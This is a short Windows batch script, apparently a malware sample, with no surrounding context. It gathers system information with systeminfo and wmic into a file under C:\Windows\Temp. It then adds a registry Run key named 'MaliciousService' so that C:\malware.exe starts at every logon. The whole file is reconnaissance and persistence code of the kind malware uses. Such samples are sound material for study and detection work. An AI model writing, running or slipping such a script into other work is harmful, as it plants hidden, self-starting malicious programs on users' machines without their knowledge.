@echo off
systeminfo > C:\Windows\Temp\sysinfo.txt
wmic os get /format:list >> C:\Windows\Temp\sysinfo.txt

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MaliciousService" /t REG_SZ /d "C:\malware.exe" /f
